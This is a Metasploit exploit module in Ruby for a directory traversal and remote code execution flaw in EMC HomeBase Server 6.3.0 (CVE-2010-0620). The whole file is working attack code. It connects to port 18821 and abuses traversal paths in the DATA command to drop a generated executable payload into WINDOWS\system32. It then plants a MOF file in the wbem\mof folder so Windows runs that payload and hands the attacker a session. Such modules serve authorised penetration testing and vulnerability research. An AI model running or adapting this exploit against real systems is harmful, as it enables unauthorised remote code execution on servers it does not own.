# $Id: emc_homebase_exec.rb 12458 2011-04-27 20:29:27Z mc $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::EXE
    include Msf::Exploit::WbemExec
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;EMC HomeBase Server Directory Traversal Remote Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a directory traversal and remote code execution
                flaw in EMC HomeBase Server 6.3.0.
 
                Note: This module has only been tested against Windows XP SP3 and Windows 2003 SP2
            },
            &#039;Author&#039;         => [ &#039;MC&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 12458 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-0620&#039; ],
                    [ &#039;BID&#039;, &#039;38380&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-10-020/&#039; ],
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 2048,
                    &#039;DisableNops&#039; => true,
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;,  { } ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Feb 23 2010&#039;))
 
        register_options(
            [
                Opt::RPORT(18821),
                OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
            ], self.class)
    end
 
    def exploit
 
        name = exe_name()
        exe_upload(name)
        select(nil,nil,nil,2)
        mof_upload(name)
        select(nil,nil,nil,4)
        handler
 
    end
 
    def exe_name
 
        rand_text_alpha_upper(8) + ".exe"
 
    end
 
    def exe_upload(exe_name)
 
        # this uploads our final exe payload.
 
        data = generate_payload_exe
        exe_dir = "/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\WINDOWS\\\\system32\\\\"
     
        connect
 
        banner = sock.get
            if ( banner =~ /EMC HomeBase HomebaseSSL Service/ )
                print_good("EMC HomeBase HomebaseSSL Service Detected!")
                print_status("Sending exe payload &#039;#{exe_name}&#039;...")
                sock.put("DATA #{exe_dir}#{exe_name} #{data.length}\r\n")
                ready = sock.get
                    if ( ready =~ /150 Ready to Recieve Data/ )
                        print_good("#{ready.strip}")
                        print_status("Sending &#039;#{data.length}&#039; bytes of data...")
                        sock.put(data)
                        complete = sock.get
                        if ( complete =~ /226 Data Complete/ )
                            print_good("#{complete.strip}")
                            print_status("Sending &#039;QUIT")
                            sock.put("quit\r\n")
                            return
                        end
                    else
                        print_error("Something went wrong...")
                        return
                    end
            else
                print_error("Not a EMC HomeBaseSSL Service")
                return
            end
         
        disconnect
 
    end
 
    def mof_upload(exe_name)
 
        # this is what runs our uploaded exe payload.
 
        mof_name = rand_text_alphanumeric(8+rand(8))
        mof      = generate_mof(mof_name, exe_name)
        mof_dir  = "/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\"
 
        connect
 
        banner = sock.get
            if ( banner =~ /EMC HomeBase HomebaseSSL Service/ )
                print_good("EMC HomeBase HomebaseSSL Service Detected!")
                print_status("Sending MOF file &#039;#{mof_name}&#039;...")
                sock.put("DATA #{mof_dir}#{mof_name} #{mof.length}\r\n")
                ready = sock.get
                    if ( ready =~ /150 Ready to Recieve Data/ )
                        print_good("#{ready.strip}")
                        print_status("Sending &#039;#{mof.length}&#039; bytes of data...")
                        sock.put(mof)
                        complete = sock.get
                            if ( complete =~ /226 Data Complete/ )
                                print_good("#{complete.strip}")
                                print_status("Sending &#039;QUIT")
                                sock.put("quit\r\n")
                                return
                            end
                    else
                        print_error("Something went wrong...")
                        return
                    end
            else
                print_error("Not a EMC HomeBaseSSL Service")
                return
                        end
 
        disconnect
 
    end
end



